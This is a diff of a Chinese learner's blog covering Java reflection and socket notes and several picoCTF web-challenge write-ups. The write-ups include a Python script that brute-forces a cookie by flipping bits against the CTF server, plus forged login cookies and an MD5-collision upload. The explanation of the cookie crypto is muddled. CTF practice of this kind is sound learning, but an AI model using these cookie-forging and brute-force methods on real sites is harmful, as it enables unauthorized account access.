System.out.println(c2.hashCode());</span><br><span class="line">        System.out.println(c3.hashCode());</span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F;方式四：基本内置类的包装类都有一个Type属性</span><br><span class="line">        Class c4&#x3D;Integer.TYPE;</span><br><span class="line">        System.out.println(c4);</span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F;获得父类的类型</span><br><span class="line">        Class c5&#x3D;c1.getSuperclass();</span><br><span class="line">        System.out.println(c5);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Person&#123;</span><br><span class="line">    public String name ;</span><br><span class="line"></span><br><span class="line">    public Person()&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    public Person(String name)&#123;</span><br><span class="line">        this.name&#x3D;name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public String toString() &#123;</span><br><span class="line">        return &quot;User&#123;&quot; +</span><br><span class="line">                &quot;name&#x3D;&#39;&quot; + name + &#39;\&#39;&#39; +</span><br><span class="line">        &#39;&#125;&#39;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Student extends Person&#123;</span><br><span class="line">    public Student()&#123;</span><br><span class="line">        this.name&#x3D;&quot;学生&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Teacher extends Person&#123;</span><br><span class="line">    public Teacher()&#123;</span><br><span class="line">        this.name&#x3D;&quot;老师&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>测试各种类型的class是什么</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">package com.kuang.lesson01;</span><br><span class="line"></span><br><span class="line">import java.lang.annotation.ElementType;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;测试class类的创建方式有哪些</span><br><span class="line">public class test02 &#123;</span><br><span class="line">    public static void main(String[] args) throws ClassNotFoundException &#123;</span><br><span class="line">        Class c1 &#x3D; Object.class;&#x2F;&#x2F;类</span><br><span class="line">        Class c2 &#x3D; Comparable.class;&#x2F;&#x2F;接口</span><br><span class="line">        Class c3 &#x3D; String[].class;&#x2F;&#x2F;一维数组</span><br><span class="line">        Class c4 &#x3D; int[][].class;&#x2F;&#x2F;二维数组</span><br><span class="line">         Class c5 &#x3D; Override.class;&#x2F;&#x2F;注解</span><br><span class="line">        Class c6 &#x3D; ElementType.class;&#x2F;&#x2F;枚举</span><br><span class="line">        Class c7 &#x3D; Integer.class;&#x2F;&#x2F;基本数据类型</span><br><span class="line">        Class c8 &#x3D; void.class;&#x2F;&#x2F;void</span><br><span class="line">        Class c9 &#x3D; Class.class;&#x2F;&#x2F;Class</span><br><span class="line"></span><br><span class="line">        System.out.println(c1);</span><br><span class="line">        System.out.println(c2);</span><br><span class="line">        System.out.println(c3);</span><br><span class="line">        System.out.println(c4);</span><br><span class="line">        System.out.println(c5);</span><br><span class="line">        System.out.println(c6);</span><br><span class="line">        System.out.println(c7);</span><br><span class="line">        System.out.println(c8);</span><br><span class="line">        System.out.println(c9);</span><br><span class="line">        </span><br><span class="line">        &#x2F;&#x2F;只要元素类型与维度一样，就是同一个class</span><br><span class="line">        int[] a&#x3D;new int[10];</span><br><span class="line">        int[] b&#x3D;new int[100];</span><br><span class="line">        System.out.println(a.getClass().hashCode());</span><br><span class="line">        System.out.println(b.getClass().hashCode());</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>java内存(讲的不是很清楚）：<br>栈<br>    Main()<br>堆<br>    java.lang.Class类<br>    new A()<br>    ……<br>方法区（特殊的堆）<br>    1.静态变量<br>    2.静态方法<br>    3.常量池<br>    4.代码<br>    ……</p>
+<p>获得类的属性：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Field[] field&#x3D;c1.getDeclaredFields();</span><br></pre></td></tr></table></figure>
+<p>获得类的方法：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Method[] nethod&#x3D;c1.getDeclaredMethods();</span><br></pre></td></tr></table></figure>
+
+<p>获得构造器：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Constructor constructor&#x3D;c1.getDeclaredConstructors();</span><br></pre></td></tr></table></figure>
+
+<p>动态创建对象：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">package com.kuang.lesson01;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">import java.lang.reflect.InvocationTargetException;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;通过反射动态创建对象</span><br><span class="line">public class test02 &#123;</span><br><span class="line">    public static void main(String[] args) throws ClassNotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException, IllegalAccessException &#123;</span><br><span class="line">        &#x2F;&#x2F;获得Class对象</span><br><span class="line">        Class c1&#x3D; Class.forName(&quot;com.kuang.lesson01.User&quot;);</span><br><span class="line">        &#x2F;&#x2F;构造一个对象</span><br><span class="line">        &#x2F;&#x2F;Object user&#x3D;(User)c1.newInstance();&#x2F;&#x2F;JDK9以后废弃了</span><br><span class="line">        Object user&#x3D;c1.getDeclaredConstructor().newInstance();&#x2F;&#x2F;一般用这个</span><br><span class="line">        System.out.println(user);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>invoke方法：激活<br>set方法：操作属性<br>若原方法为private，需要先调用setAccessible(true)方法（开启访问权限），然后就可以访问private（取消权限检测）</p>
+<p>性能分析：<br>时间：普通方式&lt;关闭检测的反射方式&lt;反射方式</p>
+<p>获取泛型信息：<br>（一脸懵逼）</p>
+<p>获取注解信息<br>获得注解<br>.getAnnotations()<br>获得注解value的值<br>.getAnnotations(xxx.class).value<br>获得类指定的注解<br>.getFecaresField(“xxx”).getAnnotations(xxx.class)</p>
+<p>说实话学完了之后对注解还是一头雾水，如果以后学框架需要的话再回来补吧</p>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2022/01/18/Java%E6%B3%A8%E8%A7%A3%E4%B8%8E%E5%8F%8D%E5%B0%84/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+    <section id="comments" style="margin:10px;padding:10px;background:#fff;">
+      <div id="vcomment" class="comment"></div> 
+<script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+<script src="//unpkg.com/valine/dist/Valine.min.js"></script>
+<script>
+   var notify = 'false' == true ? true : false;
+   var verify = 'false' == true ? true : false;
+    window.onload = function() {
+        new Valine({
+            el: '.comment',
+            notify: notify,
+            verify: verify,
+            app_id: "APP ID",
+            app_key: "APP KEY",
+            placeholder: "Just go go",
+            avatar:"retro"
+        });
+    }
+</script>
+
+    </section>
+  
+  
     <article id="post-java网络编程" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
@@ -216,6 +712,11 @@
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">package com.kuang.lesson01;</span><br><span class="line"></span><br><span class="line">import java.io.File;</span><br><span class="line">import java.io.FileInputStream;</span><br><span class="line">import java.io.IOException;</span><br><span class="line">import java.io.OutputStream;</span><br><span class="line">import java.net.InetAddress;</span><br><span class="line">import java.net.Socket;</span><br><span class="line">import java.net.UnknownHostException;</span><br><span class="line">import java.nio.charset.StandardCharsets;</span><br><span class="line"></span><br><span class="line">public class client &#123;</span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            &#x2F;&#x2F;定义端口号和ip</span><br><span class="line">            InetAddress serverIP &#x3D; InetAddress.getByName(&quot;127.0.0.1&quot;);</span><br><span class="line">            int port&#x3D;9999;</span><br><span class="line">            &#x2F;&#x2F;连接：</span><br><span class="line">            Socket socket &#x3D; new Socket(serverIP,port);</span><br><span class="line">            &#x2F;&#x2F;发送消息，io流：</span><br><span class="line">            OutputStream os &#x3D; socket.getOutputStream();</span><br><span class="line">            &#x2F;&#x2F;文件流</span><br><span class="line">            FileInputStream fis&#x3D;new FileInputStream(new File(&quot;scr&quot;));</span><br><span class="line">            &#x2F;&#x2F;写出文件</span><br><span class="line">            byte[] buffer &#x3D; new byte[1024];</span><br><span class="line">            int len;</span><br><span class="line">            while((len&#x3D;fis.read(buffer))!&#x3D;-1)&#123;</span><br><span class="line">                os.write(buffer,0,len);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; catch (UnknownHostException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; catch (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;finally &#123;</span><br><span class="line">            &#x2F;&#x2F;关闭资源：……</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">package com.kuang.lesson01;</span><br><span class="line"></span><br><span class="line">import java.io.*;</span><br><span class="line">import java.net.ServerSocket;</span><br><span class="line">import java.net.Socket;</span><br><span class="line"></span><br><span class="line">public class server &#123;</span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line">        ServerSocket serverSocket&#x3D;null;</span><br><span class="line">        Socket socket&#x3D;null;</span><br><span class="line">        InputStream is&#x3D;null;</span><br><span class="line">        try &#123;</span><br><span class="line">            serverSocket &#x3D; new ServerSocket(9999);</span><br><span class="line">            &#x2F;&#x2F;等待客户端连接过来</span><br><span class="line">            socket &#x3D; serverSocket.accept();</span><br><span class="line">            &#x2F;&#x2F;读取客户端的消息</span><br><span class="line">            is &#x3D; socket.getInputStream();</span><br><span class="line"></span><br><span class="line">            &#x2F;&#x2F;文件输出</span><br><span class="line">            FileOutputStream fos&#x3D; new FileOutputStream(new File(&quot;receive&quot;));</span><br><span class="line">            byte[] buffer&#x3D;new byte[1024];</span><br><span class="line">            int len;</span><br><span class="line">            while((len&#x3D;is.read(buffer))!&#x3D;-1)&#123;</span><br><span class="line">                fos.write(buffer,0,len);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        &#125; catch (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;finally &#123;</span><br><span class="line">            &#x2F;&#x2F;关闭资源（最好加if(baos&#x2F;is&#x2F;socket&#x2F;serverSocker!&#x3D;null))</span><br><span class="line">            try &#123;</span><br><span class="line">                is.close();</span><br><span class="line">            &#125; catch (IOException e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">            try &#123;</span><br><span class="line">                socket.close();</span><br><span class="line">            &#125; catch (IOException e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>UDP<br>发短信：不用连接，需要地址<br>发送：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">package com.kuang.lesson01;</span><br><span class="line"></span><br><span class="line">import java.net.*;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">public class client &#123;</span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line">            &#x2F;&#x2F;建立一个socket</span><br><span class="line">            DatagramSocket socket &#x3D; new DatagramSocket();</span><br><span class="line">            &#x2F;&#x2F;建个包：</span><br><span class="line">            String msg&#x3D;&quot;你好&quot;;</span><br><span class="line">            &#x2F;&#x2F;定义端口号和ip</span><br><span class="line">            InetAddress serverIP &#x3D; InetAddress.getByName(&quot;127.0.0.1&quot;);</span><br><span class="line">            int port&#x3D;9999;</span><br><span class="line">            &#x2F;&#x2F;数据，数据的长度（起始），要发送给谁</span><br><span class="line">            DatagramPacket packet&#x3D;new DatagramPacket(msg.getBytes(),0,msg.getBytes().length,serverIP,port);</span><br><span class="line">            &#x2F;&#x2F;发送包：</span><br><span class="line">            socket.send(packet);</span><br><span class="line">            &#x2F;&#x2F;关闭流：</span><br><span class="line">            socket.close();</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>接收：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">package com.kuang.lesson01;</span><br><span class="line">import java.net.*;</span><br><span class="line"></span><br><span class="line">public class server &#123;</span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line">        &#x2F;&#x2F;开放端口</span><br><span class="line">        DatagramSocket socket &#x3D; null;</span><br><span class="line">        socket &#x3D; new DatagramSocket(9999);</span><br><span class="line">        &#x2F;&#x2F;接收数据包</span><br><span class="line">        byte[] buffer&#x3D; new byte[1024];</span><br><span class="line">        DatagramPacket packet&#x3D;new DatagramPacket(buffer,0,buffer.length);</span><br><span class="line">        socket.receive(packet);&#x2F;&#x2F;阻塞接收</span><br><span class="line">        System.out.println(new String(packet.getData(),0, packet.getLength()));&#x2F;&#x2F;打印</span><br><span class="line">        &#x2F;&#x2F;关闭连接</span><br><span class="line">        socket.close();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
       
 
       
@@ -320,6 +821,27 @@
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">(async() &#x3D;&gt; &#123;</span><br><span class="line">  const findMiddlePosition &#x3D; _0x4e0e;</span><br><span class="line">  let leftBranch &#x3D; await fetch(&quot;.&#x2F;JIFxzHyW8W&quot;);</span><br><span class="line">  let rightBranch &#x3D; await WebAssembly[&quot;instantiate&quot;](await leftBranch[&quot;arrayBuffer&quot;]());</span><br><span class="line">  let module &#x3D; rightBranch[&quot;instance&quot;];</span><br><span class="line">  exports &#x3D; module[&quot;exports&quot;];</span><br><span class="line">&#125;)();</span><br><span class="line">&#x2F;**</span><br><span class="line"> * @return &#123;undefined&#125;</span><br><span class="line"> *&#x2F;</span><br><span class="line">function onButtonPress() &#123;</span><br><span class="line">  const navigatePop &#x3D; _0x4e0e;</span><br><span class="line">  let params &#x3D; document[&quot;getElementById&quot;](&quot;input&quot;)[&quot;value&quot;];</span><br><span class="line">  for (let i &#x3D; 0; i &lt; params[&quot;length&quot;]; i++) &#123;</span><br><span class="line">    exports[&quot;copy_char&quot;](params[&quot;charCodeAt&quot;](i), i);</span><br><span class="line">  &#125;</span><br><span class="line">  exports[&quot;copy_char&quot;](0, params[&quot;length&quot;]);</span><br><span class="line">  if (exports[&quot;check_flag&quot;]() &#x3D;&#x3D; 1) &#123;</span><br><span class="line">    document[&quot;getElementById&quot;](&quot;result&quot;)[&quot;innerHTML&quot;] &#x3D; &quot;Correct!&quot;;</span><br><span class="line">  &#125; else &#123;</span><br><span class="line">    document[&quot;getElementById&quot;](&quot;result&quot;)[&quot;innerHTML&quot;] &#x3D; &quot;Incorrect!&quot;;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
 <p>然后我们发现：没什么卵用。<br>无非就是输对了代码以后会显示correct，输错了会显示incorrect<br>然后回去看题目，提到了Assembly，也就是混淆这玩意的东西，所以可能是让我们找混淆这玩意的代码，直接F12,调到source，发现有个wasm，那就是代码的混淆规则，在最后找到了flag</p>
 <p>实际上：因为那一大堆字符串里面只有一个./JIFxzHyW8W像路径，按路径去试的话，一下子就出来了</p>
+<p>More Cookies<br>因为涉及密码学的知识，所以完全是知识盲区</p>
+<p>似乎是利用了AES CBC这种加密方法<br>简单了解了一下，发现这似乎并不完全算是“加密”，而是“生成”<br>这种算法是，假如我有一串字符串A<br>将A经过Base64加密，生成B<br>随机生成两个数a和b（a&lt;=128,b&lt;=128）<br>将B的第a个字符（换成ascii码）异或b（换成字符），生成C<br>然后C再进行一次base64加密，得到D，就是我们最后获取的cookie</p>
+<p>所以，由p XOR q = r 推出 p XOR r = q 得逆运算：<br>cookie用base64解密得C<br>C的第a个字符异或b得到B<br>B再被base64解密得到A，就是需要的cookie</p>
+<p>所以爆破脚本：<br>#!/usr/bin/python2<br>import requests<br>import base64</p>
+<p>s=requests.Session()<br>s.get(“<a target="_blank" rel="noopener" href="http://mercury.picoctf.net:43275/&quot;">http://mercury.picoctf.net:43275/&quot;</a>)<br>cookie=s.cookies[“auth_name”]<br>print(cookie)<br>unb64=base64.b64decode(cookie)<br>print(unb64)<br>unb64b=base64.b64decode(unb64)<br>for i in range (0,128):<br>   pos=i//8<br>   guessdec=unb64b[0:pos]+chr(ord(unb64b[pos])^(1&lt;&lt;(i%8)))+unb64b[pos+1:]<br>   guessenc1 = base64.b64encode(guessdec)<br>   guess=base64.b64encode(base64.b64encode(guessdec))<br>   r=requests.get(“<a target="_blank" rel="noopener" href="http://mercury.picoctf.net:43275/&quot;,cookies=%7B&quot;auth_name&quot;">http://mercury.picoctf.net:43275/&quot;,cookies={&quot;auth_name&quot;</a>: guess})<br>   if “pico” in r.text:<br>       print(r.text)</p>
+<p>where are the robots<br>估计是考robots.txt，试了试发现内容是User-agent: * Disallow: /1bb4c.html，直接访问拿到flag</p>
+<p>login<br>离谱<br>先是用什么账号和密码都能登上去，提示是登录Joe的账号，事实上只有Joe登不上去<br>尝试sql注入失败，估计不会爆破就没试<br>结果正确方法是：<br>先随便用一个账号和密码登录，发现cookie的内容为<br>username=123<br>password=456<br>456=False<br>所以把username的值改为Joe，把False改成True后刷新，就出flag了</p>
+<p>dont-use-client-side<br>打开后是个输入框，尝试输几个都失败了，看源码，发现前端代码：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">function verify() &#123;</span><br><span class="line">   checkpass &#x3D; document.getElementById(&quot;pass&quot;).value;</span><br><span class="line">   split &#x3D; 4;</span><br><span class="line">   if (checkpass.substring(0, split) &#x3D;&#x3D; &#39;pico&#39;) &#123;</span><br><span class="line">     if (checkpass.substring(split*6, split*7) &#x3D;&#x3D; &#39;706c&#39;) &#123;</span><br><span class="line">       if (checkpass.substring(split, split*2) &#x3D;&#x3D; &#39;CTF&#123;&#39;) &#123;</span><br><span class="line">        if (checkpass.substring(split*4, split*5) &#x3D;&#x3D; &#39;ts_p&#39;) &#123;</span><br><span class="line">         if (checkpass.substring(split*3, split*4) &#x3D;&#x3D; &#39;lien&#39;) &#123;</span><br><span class="line">           if (checkpass.substring(split*5, split*6) &#x3D;&#x3D; &#39;lz_b&#39;) &#123;</span><br><span class="line">             if (checkpass.substring(split*2, split*3) &#x3D;&#x3D; &#39;no_c&#39;) &#123;</span><br><span class="line">               if (checkpass.substring(split*7, split*8) &#x3D;&#x3D; &#39;5&#125;&#39;) &#123;</span><br><span class="line">                 alert(&quot;Password Verified&quot;)</span><br><span class="line">                 &#125;</span><br><span class="line">               &#125;</span><br><span class="line">             &#125;</span><br><span class="line">     </span><br><span class="line">           &#125;</span><br><span class="line">         &#125;</span><br><span class="line">       &#125;</span><br><span class="line">     &#125;</span><br><span class="line">   &#125;</span><br><span class="line">   else &#123;</span><br><span class="line">     alert(&quot;Incorrect password&quot;);</span><br><span class="line">   &#125;</span><br><span class="line">   </span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>
+<p>很明显，输入正确的字符串就是flag，所以这个时候最简单的方法就是：拿这一大堆字符串去爆破flag<br>picoCTF{ 和 5}都给了，要爆破的也就只有五个（开玩笑的）<br>直接看也不难，就是个拼接（数数）<br>pico<br>CTF{<br>no_c<br>lien<br>ts_p<br>lz_b<br>706c<br>5}</p>
+<p>It is my Birthday<br>打开以后要上传两个文件，盲猜是要碰撞了，但不知道是什么碰撞<br>所以先传两个试试<br>发现需要传pdf，那就传<br>发现Files are not different! 那就传不一样的<br>回显MD5 hashes do not match!<br>猜的没错，md5碰撞<br>随便从网上找两个抄上去<br>然后就出答案了，而且非常贴心的给了源码！</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">if (isset($_POST[&quot;submit&quot;])) &#123;</span><br><span class="line">    $type1 &#x3D; $_FILES[&quot;file1&quot;][&quot;type&quot;];</span><br><span class="line">    $type2 &#x3D; $_FILES[&quot;file2&quot;][&quot;type&quot;];</span><br><span class="line">    $size1 &#x3D; $_FILES[&quot;file1&quot;][&quot;size&quot;];</span><br><span class="line">    $size2 &#x3D; $_FILES[&quot;file2&quot;][&quot;size&quot;];</span><br><span class="line">    $SIZE_LIMIT &#x3D; 18 * 1024;</span><br><span class="line"></span><br><span class="line">    if (($size1 &lt; $SIZE_LIMIT) &amp;&amp; ($size2 &lt; $SIZE_LIMIT)) &#123;</span><br><span class="line">        if (($type1 &#x3D;&#x3D; &quot;application&#x2F;pdf&quot;) &amp;&amp; ($type2 &#x3D;&#x3D; &quot;application&#x2F;pdf&quot;)) &#123;</span><br><span class="line">            $contents1 &#x3D; file_get_contents($_FILES[&quot;file1&quot;][&quot;tmp_name&quot;]);</span><br><span class="line">            $contents2 &#x3D; file_get_contents($_FILES[&quot;file2&quot;][&quot;tmp_name&quot;]);</span><br><span class="line"></span><br><span class="line">            if ($contents1 !&#x3D; $contents2) &#123;</span><br><span class="line">                if (md5_file($_FILES[&quot;file1&quot;][&quot;tmp_name&quot;]) &#x3D;&#x3D; md5_file($_FILES[&quot;file2&quot;][&quot;tmp_name&quot;])) 